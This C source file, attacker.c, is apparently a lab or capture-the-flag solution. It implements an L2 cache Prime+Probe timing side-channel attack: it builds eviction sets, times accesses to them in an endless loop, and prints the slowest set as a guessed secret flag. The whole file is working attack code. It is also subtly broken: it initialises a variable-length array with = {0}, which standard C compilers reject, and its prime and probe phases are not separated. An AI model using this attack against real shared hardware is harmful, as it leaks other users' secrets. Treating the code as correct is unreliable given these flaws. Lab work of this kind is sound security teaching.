/* attacker.c */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include "util.h"

#define NUM_TRIALS 100  // Number of times to repeat probing to get average latency

int main() {
    // Step 1: Allocate a large buffer (huge pages)
    uint8_t *buffer = get_buffer(); // Provided by util.c

    // Step 2: Constants
    const int num_sets = NUM_L2_CACHE_SETS;  // Provided by util.h
    const int probe_ways = 8;  // Number of accesses per set (tune this)

    // Step 3: Prepare eviction set per cache set
    uint8_t *eviction_sets[num_sets][probe_ways];

    for (int set = 0; set < num_sets; set++) {
        for (int way = 0; way < probe_ways; way++) {
            eviction_sets[set][way] = set_to_addr(buffer, set, way);
        }
    }

    // Step 4: Main Attack Loop
    while (1) {
        uint64_t set_latencies[num_sets] = {0};

        // Probe each set
        for (int trial = 0; trial < NUM_TRIALS; trial++) {
            for (int set = 0; set < num_sets; set++) {
                for (int way = 0; way < probe_ways; way++) {
                    // Measure access time to each address
                    set_latencies[set] += measure_one_block_access_time(eviction_sets[set][way]);
                }
            }
        }

        // Step 5: Find the set with highest latency (victim set)
        int guessed_flag = 0;
        uint64_t max_latency = 0;

        for (int set = 0; set < num_sets; set++) {
            if (set_latencies[set] > max_latency) {
                max_latency = set_latencies[set];
                guessed_flag = set;
            }
        }

        printf("Guessed flag: %d\n", guessed_flag);

        // Sleep before next guess to avoid spamming
        sleep(1);
    }

    return 0;
}
